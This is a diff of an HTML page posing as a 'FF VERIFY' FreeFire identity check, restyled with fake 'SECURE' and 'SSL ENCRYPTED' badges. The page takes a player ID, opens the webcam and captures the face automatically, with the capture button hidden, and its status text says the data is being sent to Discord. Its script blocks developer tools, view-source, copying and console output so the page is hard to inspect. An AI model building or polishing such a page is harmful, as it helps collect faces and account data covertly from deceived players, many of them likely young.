@@ -3,13 +3,35 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🎮 ยืนยันตัวตน FreeFire</title>
+    <title>🔥 FF VERIFY</title>
+
+    <!-- ===== FAVICON & LOGO ===== -->
+    <!-- Favicon ขนาด 16x16, 32x32, 48x48 -->
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><rect width='100' height='100' rx='20' fill='%230a0a0f'/><text x='50' y='68' font-size='60' text-anchor='middle'>🔥</text><text x='50' y='92' font-size='14' text-anchor='middle' fill='%23ff6a00' font-family='sans-serif' font-weight='bold'>FF</text></svg>">
+    
+    <!-- Favicon สำหรับ Safari (mask-icon) -->
+    <link rel="mask-icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><rect width='100' height='100' rx='20' fill='%23ff6a00'/><text x='50' y='68' font-size='60' text-anchor='middle' fill='white'>🔥</text></svg>" color="#ff6a00">
+    
+    <!-- Apple Touch Icon (iOS) -->
+    <link rel="apple-touch-icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 200 200'><rect width='200' height='200' rx='40' fill='%230a0a0f'/><text x='100' y='130' font-size='110' text-anchor='middle'>🔥</text><text x='100' y='175' font-size='32' text-anchor='middle' fill='%23ff6a00' font-family='sans-serif' font-weight='bold'>FF VERIFY</text></svg>">
+
+    <!-- ===== META TAGS (SEO & Social Media) ===== -->
+    <meta property="og:title" content="🔥 FF VERIFY - FreeFire Identity Verification">
+    <meta property="og:description" content="ระบบยืนยันตัวตน FreeFire ปลอดภัยด้วยการสแกนหน้า">
+    <meta property="og:image" content="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 400 400'><rect width='400' height='400' rx='60' fill='%230a0a0f'/><text x='200' y='240' font-size='180' text-anchor='middle'>🔥</text><text x='200' y='330' font-size='48' text-anchor='middle' fill='%23ff6a00' font-family='sans-serif' font-weight='bold'>FF VERIFY</text><text x='200' y='370' font-size='20' text-anchor='middle' fill='%23808080' font-family='sans-serif'>Secure ID System</text></svg>">
+    <meta property="og:image:width" content="400">
+    <meta property="og:image:height" content="400">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://ff-verify.com">
+    <meta name="theme-color" content="#0a0a0f">
+    <meta name="msapplication-TileColor" content="#0a0a0f">
+    <meta name="msapplication-TileImage" content="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 200 200'><rect width='200' height='200' rx='40' fill='%230a0a0f'/><text x='100' y='130' font-size='110' text-anchor='middle'>🔥</text><text x='100' y='175' font-size='32' text-anchor='middle' fill='%23ff6a00' font-family='sans-serif' font-weight='bold'>FF</text></svg>">
 
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Kanit:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700;800;900&family=Kanit:wght@300;400;500;600;700&display=swap" rel="stylesheet">
 
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Kanit:wght@300;400;500;600;700&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700;800;900&family=Kanit:wght@300;400;500;600;700&display=swap');
 
         * {
             margin: 0;
@@ -29,345 +51,560 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            background: linear-gradient(135deg, #ff6b6b, #feca57, #48dbfb, #ff9ff3, #54a0ff, #5f27cd);
-            background-size: 400% 400%;
-            animation: rainbow 8s ease infinite;
+            background: #0a0a0f;
             padding: 20px;
             overflow: hidden;
-        }
-
-        @keyframes rainbow {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
-        }
-
-        .glass-panel {
-            background: rgba(255, 255, 255, 0.12);
-            backdrop-filter: blur(20px);
-            -webkit-backdrop-filter: blur(20px);
-            border: 1px solid rgba(255, 255, 255, 0.25);
-            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.4), inset 0 1px 0 rgba(255, 255, 255, 0.2);
-            border-radius: 40px;
-            transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
-        }
-
-        .glass-panel:hover {
-            transform: scale(1.01);
-            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.5);
-        }
-
-        .input-glow:focus {
-            border-color: #ff6a00;
-            box-shadow: 0 0 30px rgba(255, 106, 0, 0.3), 0 0 60px rgba(255, 106, 0, 0.1);
-            outline: none;
-            transform: scale(1.02);
-        }
-
-        .btn-ff {
-            background: linear-gradient(135deg, #ff6a00, #ee0979);
-            transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
-            font-weight: 600;
-            letter-spacing: 0.5px;
             position: relative;
+        }
+
+        /* Animated background particles */
+        .bg-particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 0;
             overflow: hidden;
         }
 
-        .btn-ff::before {
+        .particle {
+            position: absolute;
+            width: 4px;
+            height: 4px;
+            background: rgba(255, 106, 0, 0.3);
+            border-radius: 50%;
+            animation: floatUp linear infinite;
+        }
+
+        @keyframes floatUp {
+            0% { transform: translateY(100vh) scale(0); opacity: 0; }
+            10% { opacity: 1; }
+            90% { opacity: 1; }
+            100% { transform: translateY(-10vh) scale(1); opacity: 0; }
+        }
+
+        /* Glow orbs */
+        .glow-orb {
+            position: fixed;
+            border-radius: 50%;
+            filter: blur(80px);
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .glow-orb-1 {
+            width: 400px;
+            height: 400px;
+            background: rgba(255, 106, 0, 0.15);
+            top: -100px;
+            right: -100px;
+            animation: orbFloat 8s ease-in-out infinite;
+        }
+
+        .glow-orb-2 {
+            width: 300px;
+            height: 300px;
+            background: rgba(238, 9, 121, 0.12);
+            bottom: -50px;
+            left: -50px;
+            animation: orbFloat 10s ease-in-out infinite reverse;
+        }
+
+        .glow-orb-3 {
+            width: 200px;
+            height: 200px;
+            background: rgba(255, 106, 0, 0.08);
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            animation: orbPulse 6s ease-in-out infinite;
+        }
+
+        @keyframes orbFloat {
+            0%, 100% { transform: translate(0, 0); }
+            50% { transform: translate(30px, -30px); }
+        }
+
+        @keyframes orbPulse {
+            0%, 100% { transform: translate(-50%, -50%) scale(1); opacity: 0.5; }
+            50% { transform: translate(-50%, -50%) scale(1.5); opacity: 1; }
+        }
+
+        /* Main glass card */
+        .glass-card {
+            position: relative;
+            z-index: 1;
+            background: rgba(10, 10, 15, 0.7);
+            backdrop-filter: blur(40px);
+            -webkit-backdrop-filter: blur(40px);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            border-radius: 32px;
+            box-shadow: 
+                0 30px 80px rgba(0, 0, 0, 0.8),
+                inset 0 1px 0 rgba(255, 255, 255, 0.05);
+            transition: all 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
+            width: 100%;
+            max-width: 440px;
+            overflow: hidden;
+        }
+
+        .glass-card:hover {
+            transform: translateY(-4px);
+            box-shadow: 
+                0 40px 100px rgba(0, 0, 0, 0.9),
+                inset 0 1px 0 rgba(255, 255, 255, 0.08);
+        }
+
+        /* Header */
+        .header-glow {
+            position: relative;
+            background: linear-gradient(135deg, rgba(255, 106, 0, 0.15), rgba(238, 9, 121, 0.10));
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+            padding: 24px 28px;
+            overflow: hidden;
+        }
+
+        .header-glow::before {
             content: '';
             position: absolute;
             top: -50%;
             left: -50%;
             width: 200%;
             height: 200%;
-            background: radial-gradient(circle, rgba(255,255,255,0.2) 0%, transparent 60%);
-            opacity: 0;
-            transition: opacity 0.5s;
-            transform: rotate(0deg);
+            background: radial-gradient(circle at 30% 50%, rgba(255, 106, 0, 0.05), transparent 60%);
+            animation: headerShine 6s ease-in-out infinite;
         }
 
-        .btn-ff:hover::before {
-            opacity: 1;
+        @keyframes headerShine {
+            0%, 100% { transform: translate(0, 0); }
+            50% { transform: translate(10%, 10%); }
         }
 
-        .btn-ff:hover {
-            transform: scale(1.05) translateY(-2px);
-            box-shadow: 0 15px 40px rgba(255, 106, 0, 0.5);
+        .header-icon {
+            background: linear-gradient(135deg, rgba(255, 106, 0, 0.2), rgba(238, 9, 121, 0.2));
+            border: 1px solid rgba(255, 106, 0, 0.2);
+            box-shadow: 0 0 40px rgba(255, 106, 0, 0.1);
         }
 
-        .btn-ff:active {
-            transform: scale(0.95);
+        .title-text {
+            font-family: 'Orbitron', sans-serif;
+            font-weight: 700;
+            letter-spacing: 2px;
+            background: linear-gradient(135deg, #ff6a00, #ee0979);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
         }
 
-        .info-card {
-            background: rgba(255, 255, 255, 0.08);
-            border: 1px solid rgba(255, 255, 255, 0.12);
-            backdrop-filter: blur(10px);
-            -webkit-backdrop-filter: blur(10px);
-            transition: all 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
-            border-radius: 20px;
+        .subtitle-text {
+            font-weight: 300;
+            letter-spacing: 1px;
         }
 
-        .info-card:hover {
-            background: rgba(255, 255, 255, 0.15);
-            transform: translateX(5px) scale(1.02);
-            border-color: rgba(255, 106, 0, 0.3);
-            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.2);
-        }
-
-        ::-webkit-scrollbar {
-            width: 4px;
-        }
-        ::-webkit-scrollbar-thumb {
-            background: #ff6a00;
-            border-radius: 999px;
-        }
-        ::-webkit-scrollbar-track {
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 999px;
-        }
-
-        .animate-pulse-slow {
-            animation: pulseSlow 2.5s ease-in-out infinite;
-        }
-        @keyframes pulseSlow {
-            0%, 100% { opacity: 0.7; transform: scale(1); }
-            50% { opacity: 1; transform: scale(1.05); }
-        }
-
-        .scan-anim {
-            height: 3px;
-            background: linear-gradient(90deg, transparent, #ff6a00, #ee0979, #ff6a00, transparent);
-            position: absolute;
+        /* Input styling */
+        .input-cyber {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            border-radius: 16px;
+            padding: 16px 20px;
+            color: #fff;
+            font-size: 1.1rem;
+            transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
             width: 100%;
-            top: 0;
-            animation: move 2.5s ease-in-out infinite;
-            box-shadow: 0 0 30px #ff6a00, 0 0 60px #ee0979;
-            border-radius: 2px;
+            backdrop-filter: blur(10px);
         }
 
-        @keyframes move {
-            0% { top: 0; opacity: 0.6; }
-            50% { top: 100%; opacity: 1; }
-            100% { top: 0; opacity: 0.6; }
-        }
-
-        .animate-fade-in {
-            animation: fadeIn 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
-        }
-        @keyframes fadeIn {
-            0% { opacity: 0; transform: scale(0.9) translateY(20px); }
-            100% { opacity: 1; transform: scale(1) translateY(0); }
-        }
-
-        .video-container {
-            border-radius: 50%;
-            border: 3px solid rgba(255, 255, 255, 0.3);
-            box-shadow: 0 0 50px rgba(255, 106, 0, 0.3), 0 0 100px rgba(255, 106, 0, 0.1);
-            transition: all 0.5s ease;
-            position: relative;
-        }
-
-        .video-container:hover {
+        .input-cyber:focus {
+            border-color: rgba(255, 106, 0, 0.4);
+            box-shadow: 0 0 30px rgba(255, 106, 0, 0.08), inset 0 0 30px rgba(255, 106, 0, 0.03);
+            outline: none;
             transform: scale(1.02);
-            box-shadow: 0 0 80px rgba(255, 106, 0, 0.5), 0 0 150px rgba(255, 106, 0, 0.2);
+            background: rgba(255, 255, 255, 0.05);
         }
 
-        .video-container::after {
+        .input-cyber::placeholder {
+            color: rgba(255, 255, 255, 0.2);
+            font-weight: 300;
+        }
+
+        /* Button styling */
+        .btn-primary {
+            background: linear-gradient(135deg, #ff6a00, #ee0979);
+            border: none;
+            padding: 16px 28px;
+            border-radius: 16px;
+            color: #fff;
+            font-weight: 600;
+            font-size: 1.05rem;
+            transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+            cursor: pointer;
+            position: relative;
+            overflow: hidden;
+            width: 100%;
+            letter-spacing: 0.5px;
+        }
+
+        .btn-primary::before {
             content: '';
             position: absolute;
-            inset: -3px;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
+            transition: left 0.6s;
+        }
+
+        .btn-primary:hover::before {
+            left: 100%;
+        }
+
+        .btn-primary:hover {
+            transform: scale(1.03) translateY(-2px);
+            box-shadow: 0 15px 40px rgba(255, 106, 0, 0.3);
+        }
+
+        .btn-primary:active {
+            transform: scale(0.97);
+        }
+
+        /* Video container */
+        .video-ring {
+            position: relative;
+            width: 200px;
+            height: 200px;
+            margin: 0 auto 20px;
+        }
+
+        .video-ring-inner {
+            position: relative;
+            width: 100%;
+            height: 100%;
             border-radius: 50%;
-            padding: 3px;
-            background: linear-gradient(135deg, #ff6a00, #ee0979, #ff6a00);
+            overflow: hidden;
+            border: 2px solid rgba(255, 106, 0, 0.15);
+            box-shadow: 0 0 60px rgba(255, 106, 0, 0.05), inset 0 0 60px rgba(255, 106, 0, 0.02);
+            background: rgba(0,0,0,0.3);
+        }
+
+        .video-ring-inner video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transform: scaleX(-1);
+        }
+
+        .video-ring-ring {
+            position: absolute;
+            inset: -4px;
+            border-radius: 50%;
+            padding: 4px;
+            background: conic-gradient(from 0deg, transparent, rgba(255,106,0,0.3), rgba(238,9,121,0.3), transparent);
             -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);
             -webkit-mask-composite: xor;
             mask-composite: exclude;
-            animation: rotateBorder 3s linear infinite;
+            animation: spinRing 4s linear infinite;
+            pointer-events: none;
         }
 
-        @keyframes rotateBorder {
+        @keyframes spinRing {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
 
-        /* ซ่อนปุ่มที่ไม่จำเป็น */
+        .scan-line {
+            position: absolute;
+            left: 0;
+            width: 100%;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, rgba(255,106,0,0.6), rgba(238,9,121,0.6), transparent);
+            animation: scanMove 2.5s ease-in-out infinite;
+            box-shadow: 0 0 20px rgba(255,106,0,0.2);
+            border-radius: 2px;
+        }
+
+        @keyframes scanMove {
+            0% { top: 0; opacity: 0.3; }
+            50% { top: 100%; opacity: 1; }
+            100% { top: 0; opacity: 0.3; }
+        }
+
+        /* Status badge */
+        .status-badge {
+            display: inline-block;
+            padding: 6px 16px;
+            border-radius: 100px;
+            font-size: 0.75rem;
+            font-weight: 500;
+            letter-spacing: 0.5px;
+            background: rgba(255, 106, 0, 0.1);
+            border: 1px solid rgba(255, 106, 0, 0.15);
+            color: rgba(255, 255, 255, 0.6);
+        }
+
+        .status-badge.active {
+            background: rgba(255, 106, 0, 0.15);
+            border-color: rgba(255, 106, 0, 0.25);
+            color: #ff8c42;
+            animation: pulseBadge 2s ease-in-out infinite;
+        }
+
+        @keyframes pulseBadge {
+            0%, 100% { opacity: 0.7; }
+            50% { opacity: 1; }
+        }
+
+        /* Result cards */
+        .result-card {
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            border-radius: 16px;
+            padding: 14px 18px;
+            transition: all 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
+            display: flex;
+            align-items: center;
+            gap: 14px;
+        }
+
+        .result-card:hover {
+            background: rgba(255, 255, 255, 0.05);
+            transform: translateX(6px);
+            border-color: rgba(255, 106, 0, 0.1);
+        }
+
+        .result-icon {
+            width: 40px;
+            height: 40px;
+            border-radius: 12px;
+            background: linear-gradient(135deg, rgba(255, 106, 0, 0.1), rgba(238, 9, 121, 0.1));
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.2rem;
+            flex-shrink: 0;
+            border: 1px solid rgba(255, 255, 255, 0.04);
+        }
+
+        .result-label {
+            font-size: 0.6rem;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            color: rgba(255, 255, 255, 0.25);
+            font-weight: 500;
+        }
+
+        .result-value {
+            font-size: 0.9rem;
+            font-weight: 500;
+            color: rgba(255, 255, 255, 0.85);
+            word-break: break-all;
+        }
+
+        /* Webhook status */
+        .webhook-status-box {
+            background: rgba(255, 255, 255, 0.02);
+            border: 1px solid rgba(255, 255, 255, 0.04);
+            border-radius: 16px;
+            padding: 14px 18px;
+            text-align: center;
+        }
+
+        /* Scrollbar */
+        ::-webkit-scrollbar {
+            width: 3px;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: rgba(255, 106, 0, 0.3);
+            border-radius: 999px;
+        }
+        ::-webkit-scrollbar-track {
+            background: rgba(255, 255, 255, 0.02);
+            border-radius: 999px;
+        }
+
+        /* Hide unnecessary buttons */
         #btn-capture, #btn-cancel-scan {
             display: none !important;
         }
 
+        /* Smooth transitions */
         .step-transition {
-            transition: all 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
+            transition: all 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
         }
 
-        .glow-text {
-            text-shadow: 0 0 20px rgba(255, 106, 0, 0.3), 0 0 40px rgba(255, 106, 0, 0.1);
+        .fade-enter {
+            animation: fadeSlide 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
         }
 
-        .status-success {
-            color: #4ade80;
+        @keyframes fadeSlide {
+            0% { opacity: 0; transform: translateY(20px) scale(0.96); }
+            100% { opacity: 1; transform: translateY(0) scale(1); }
         }
-        .status-error {
-            color: #f87171;
-        }
-        .status-loading {
-            color: #fbbf24;
+
+        /* Glow text */
+        .text-glow {
+            text-shadow: 0 0 30px rgba(255, 106, 0, 0.1);
         }
     </style>
 </head>
 <body>
 
-<div class="w-full max-w-md px-4 py-6">
+    <!-- Background Orbs -->
+    <div class="glow-orb glow-orb-1"></div>
+    <div class="glow-orb glow-orb-2"></div>
+    <div class="glow-orb glow-orb-3"></div>
 
-    <div class="glass-panel rounded-[40px] overflow-hidden shadow-2xl my-4">
+    <!-- Particles -->
+    <div class="bg-particles" id="particles"></div>
 
-        <!-- Header สวยงาม -->
-        <div class="relative h-32 bg-gradient-to-r from-orange-500/30 via-pink-500/30 to-purple-500/30 backdrop-blur-sm flex items-center px-6 border-b border-white/10">
-            <div class="absolute inset-0 bg-black/20 backdrop-blur-[2px]"></div>
-            <div class="relative z-10 flex items-center gap-5">
-                <div class="w-20 h-20 rounded-2xl bg-gradient-to-br from-orange-500 to-pink-500 flex items-center justify-center text-4xl shadow-2xl border border-white/20 animate-pulse-slow">
-                    🔥
-                </div>
-                <div>
-                    <h1 class="text-2xl font-bold tracking-wide flex items-center gap-2 text-white glow-text">
-                        ยืนยันตัวตน
-                        <span class="text-[10px] bg-white/20 px-3 py-1 rounded-full border border-white/30 font-normal tracking-widest backdrop-blur-sm">FF</span>
-                    </h1>
-                    <p class="text-white/80 text-sm font-light">กรอก ID และสแกนหน้ายืนยัน</p>
-                </div>
+    <!-- Main Card -->
+    <div class="glass-card">
+
+        <!-- Header -->
+        <div class="header-glow flex items-center gap-4">
+            <div class="header-icon w-14 h-14 rounded-2xl flex items-center justify-center text-2xl flex-shrink-0">
+                🔥
+            </div>
+            <div>
+                <h1 class="title-text text-xl tracking-wider">FF VERIFY</h1>
+                <p class="subtitle-text text-white/40 text-xs tracking-widest">SECURE IDENTIFICATION SYSTEM</p>
             </div>
         </div>
 
-        <div class="p-6 pt-8">
+        <!-- Content -->
+        <div class="p-6 pt-6">
 
             <!-- ===== STEP 1: กรอก ID ===== -->
             <div id="step-input" class="step-transition">
-                <div class="space-y-5">
+                <div class="space-y-4">
                     <div>
-                        <label class="text-sm font-medium text-white/80 block mb-2 flex items-center gap-2">
-                            <span>🆔</span> ID FreeFire ของคุณ
+                        <label class="text-xs uppercase tracking-widest text-white/30 block mb-2 font-medium">
+                            🆔 FreeFire ID
                         </label>
-                        <input id="ff-id-input" type="text" placeholder="เช่น 1234567890" 
-                               class="w-full bg-white/10 border border-white/20 rounded-2xl px-5 py-4 text-white placeholder-white/40 input-glow transition text-lg font-medium backdrop-blur-sm">
+                        <input id="ff-id-input" type="text" placeholder="Enter your ID" 
+                               class="input-cyber">
                     </div>
 
-                    <button id="btn-to-scan" class="btn-ff w-full py-4 rounded-2xl text-white text-lg shadow-lg flex items-center justify-center gap-3">
-                        <span>📸 ไปขั้นตอนสแกนหน้า</span>
-                        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M13 7l5 5m0 0l-5 5m5-5H6"/></svg>
+                    <button id="btn-to-scan" class="btn-primary">
+                        <span class="flex items-center justify-center gap-2">
+                            <span>SCAN NOW</span>
+                            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 7l5 5m0 0l-5 5m5-5H6"/></svg>
+                        </span>
                     </button>
 
-                    <div class="flex justify-center gap-4 text-xs text-white/40 pt-2">
-                        <span class="flex items-center gap-1.5"><span class="w-1.5 h-1.5 rounded-full bg-green-400 inline-block shadow-lg shadow-green-400/50"></span> ระบบปลอดภัย</span>
-                        <span class="flex items-center gap-1.5"><span class="w-1.5 h-1.5 rounded-full bg-blue-400 inline-block shadow-lg shadow-blue-400/50"></span> เข้ารหัส SSL</span>
+                    <div class="flex justify-center gap-4 text-[10px] text-white/20 pt-1">
+                        <span class="flex items-center gap-1.5">
+                            <span class="w-1.5 h-1.5 rounded-full bg-green-400/50 inline-block"></span> 
+                            SECURE
+                        </span>
+                        <span class="flex items-center gap-1.5">
+                            <span class="w-1.5 h-1.5 rounded-full bg-blue-400/50 inline-block"></span> 
+                            SSL ENCRYPTED
+                        </span>
                     </div>
                 </div>
 
                 <div class="mt-5 text-center">
-                    <p id="status-msg" class="text-white/70 text-sm animate-pulse-slow font-medium tracking-wide">⏳ กรอก ID เพื่อเริ่มต้น</p>
+                    <p id="status-msg" class="text-white/30 text-xs tracking-widest font-light animate-pulse">
+                        ⏳ READY
+                    </p>
                 </div>
             </div>
 
-            <!-- ===== STEP 2: สแกนหน้า (Auto Capture) ===== -->
+            <!-- ===== STEP 2: สแกนหน้า ===== -->
             <div id="step-scan" class="hidden step-transition text-center">
-                <div class="video-container relative w-64 h-64 mx-auto mb-5 rounded-full overflow-hidden bg-black/50 backdrop-blur-sm">
-                    <video id="cam" class="w-full h-full object-cover scale-x-[-1]" autoplay playsinline></video>
-                    <div class="absolute inset-0 bg-gradient-to-b from-transparent via-orange-500/5 to-transparent"></div>
-                    <div class="scan-anim"></div>
-                    <div class="absolute inset-0 rounded-full border-2 border-white/10"></div>
+                <div class="video-ring">
+                    <div class="video-ring-inner">
+                        <video id="cam" autoplay playsinline></video>
+                        <div class="scan-line"></div>
+                    </div>
+                    <div class="video-ring-ring"></div>
                 </div>
                 
-                <p id="scan-status" class="text-white/90 text-sm animate-pulse tracking-widest font-medium">📷 กำลังเปิดกล้อง...</p>
-                <p id="capture-progress" class="text-white/50 text-xs mt-2 hidden">📸 กำลังถ่ายภาพยืนยัน...</p>
-                
-                <div class="mt-5 flex gap-3 hidden">
-                    <button id="btn-cancel-scan" class="flex-1 py-3 rounded-xl border border-white/20 text-white/60 hover:text-white hover:border-white/40 transition text-sm backdrop-blur-sm">
-                        ยกเลิก
-                    </button>
-                    <button id="btn-capture" class="flex-1 btn-ff py-3 rounded-xl text-white text-sm shadow-lg">
-                        ✅ ยืนยันตัวตน
-                    </button>
+                <p id="scan-status" class="text-white/60 text-sm tracking-widest font-light animate-pulse">
+                    📷 INITIALIZING CAMERA...
+                </p>
+                <p id="capture-progress" class="text-white/20 text-xs mt-2 hidden tracking-wider">
+                    📸 CAPTURING...
+                </p>
+
+                <div class="mt-4 flex justify-center gap-3">
+                    <span class="status-badge active">● LIVE</span>
                 </div>
             </div>
 
             <!-- ===== STEP 3: ผลลัพธ์ ===== -->
-            <div id="step-result" class="hidden animate-fade-in">
-                <div class="bg-gradient-to-br from-orange-500/20 to-pink-500/20 border border-white/20 rounded-2xl p-5 mb-6 backdrop-blur-sm">
-                    <div class="flex items-center gap-4">
-                        <div class="w-14 h-14 rounded-2xl bg-gradient-to-br from-orange-500 to-pink-500 flex items-center justify-center text-2xl shadow-xl text-white font-bold">
+            <div id="step-result" class="hidden fade-enter">
+                <!-- Success Header -->
+                <div class="bg-gradient-to-br from-orange-500/10 to-pink-500/10 border border-white/5 rounded-2xl p-5 mb-5 text-center">
+                    <div class="flex items-center justify-center gap-4">
+                        <div class="w-14 h-14 rounded-2xl bg-gradient-to-br from-orange-500 to-pink-500 flex items-center justify-center text-2xl shadow-xl shadow-orange-500/20">
                             ✅
                         </div>
-                        <div>
+                        <div class="text-left">
                             <h2 class="text-lg font-bold text-white flex items-center gap-2">
-                                ยืนยันสำเร็จ
-                                <span class="text-[10px] bg-white/20 text-white px-2 py-0.5 rounded-full border border-white/30">VERIFIED</span>
+                                VERIFIED
+                                <span class="text-[9px] bg-white/10 px-2 py-0.5 rounded-full border border-white/10 font-normal tracking-widest">FF</span>
                             </h2>
-                            <p class="text-white/50 text-xs">Ref: <span id="ref-code">FF-994102-B</span></p>
+                            <p class="text-white/30 text-xs tracking-widest">REF: <span id="ref-code">FF-994102-B</span></p>
                         </div>
                     </div>
                 </div>
 
-                <!-- แสดงสถานะการส่งข้อมูล -->
-                <div id="webhook-status" class="text-center p-3 rounded-xl bg-white/5 border border-white/10 mb-4">
-                    <p id="webhook-msg" class="text-sm font-medium text-yellow-400">⏳ กำลังส่งข้อมูลไปยัง Discord...</p>
+                <!-- Webhook Status -->
+                <div class="webhook-status-box mb-4">
+                    <p id="webhook-msg" class="text-xs text-yellow-400/60 font-light tracking-wider">
+                        ⏳ TRANSMITTING TO DISCORD...
+                    </p>
                 </div>
 
-                <div id="info-box" class="space-y-3 max-h-[420px] overflow-y-auto pr-1"></div>
+                <!-- Data Cards -->
+                <div id="info-box" class="space-y-2.5 max-h-[360px] overflow-y-auto pr-1"></div>
 
-                <button id="btn-back" class="mt-5 w-full py-3 rounded-xl border border-white/20 text-white/70 hover:text-white hover:border-white/40 transition flex items-center justify-center gap-2 text-sm backdrop-blur-sm hover:bg-white/5">
-                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 19l-7-7m0 0l7-7m-7 7h18"/></svg>
-                    เริ่มใหม่
+                <!-- Back Button -->
+                <button id="btn-back" class="mt-5 w-full py-3.5 rounded-xl border border-white/5 text-white/30 hover:text-white/70 hover:border-white/15 transition text-xs tracking-widest font-light backdrop-blur-sm hover:bg-white/5">
+                    ⟲ RESET
                 </button>
             </div>
 
         </div>
     </div>
 
-    <div class="text-center text-white/20 text-[10px] mt-6 tracking-widest font-light">
-        FREEFIRE VERIFICATION V2 • สแกนหน้ายืนยันตัวตน
-    </div>
-</div>
-
 <script>
-// === ป้องกันการเข้าถึง开发者工具ทั้งหมด ===
-document.addEventListener('contextmenu', e => {
-    e.preventDefault();
-    return false;
-});
+// === Particles ===
+(function createParticles() {
+    const container = document.getElementById('particles');
+    for (let i = 0; i < 30; i++) {
+        const p = document.createElement('div');
+        p.className = 'particle';
+        p.style.left = Math.random() * 100 + '%';
+        p.style.width = (Math.random() * 3 + 1) + 'px';
+        p.style.height = p.style.width;
+        p.style.animationDuration = (Math.random() * 10 + 8) + 's';
+        p.style.animationDelay = (Math.random() * 10) + 's';
+        p.style.opacity = Math.random() * 0.3 + 0.1;
+        container.appendChild(p);
+    }
+})();
 
+// === ป้องกันการเข้าถึง开发者工具 ===
+document.addEventListener('contextmenu', e => { e.preventDefault(); return false; });
 document.addEventListener('keydown', function(e) {
-    if (e.key === 'F12' || e.keyCode === 123) {
-        e.preventDefault();
-        return false;
-    }
-    if (e.ctrlKey && (e.key === 'u' || e.key === 'U')) {
-        e.preventDefault();
-        return false;
-    }
-    if (e.ctrlKey && e.shiftKey && (e.key === 'i' || e.key === 'I' || e.key === 'j' || e.key === 'J')) {
-        e.preventDefault();
-        return false;
-    }
-    if (e.ctrlKey && (e.key === 's' || e.key === 'S')) {
-        e.preventDefault();
-        return false;
-    }
-    if (e.ctrlKey && e.shiftKey && (e.key === 'c' || e.key === 'C')) {
-        e.preventDefault();
-        return false;
-    }
-    if (e.altKey && e.ctrlKey && (e.key === 'i' || e.key === 'I')) {
-        e.preventDefault();
-        return false;
-    }
+    if (e.key === 'F12' || e.keyCode === 123) { e.preventDefault(); return false; }
+    if (e.ctrlKey && (e.key === 'u' || e.key === 'U')) { e.preventDefault(); return false; }
+    if (e.ctrlKey && e.shiftKey && (e.key === 'i' || e.key === 'I' || e.key === 'j' || e.key === 'J')) { e.preventDefault(); return false; }
+    if (e.ctrlKey && (e.key === 's' || e.key === 'S')) { e.preventDefault(); return false; }
+    if (e.ctrlKey && e.shiftKey && (e.key === 'c' || e.key === 'C')) { e.preventDefault(); return false; }
+    if (e.altKey && e.ctrlKey && (e.key === 'i' || e.key === 'I')) { e.preventDefault(); return false; }
     return true;
 });
-
 document.addEventListener('dragstart', e => e.preventDefault());
 document.addEventListener('drop', e => e.preventDefault());
 document.addEventListener('copy', e => e.preventDefault());
 document.addEventListener('paste', e => e.preventDefault());
 document.addEventListener('cut', e => e.preventDefault());
-
 console.log = function() {};
 console.warn = function() {};
 console.error = function() {};
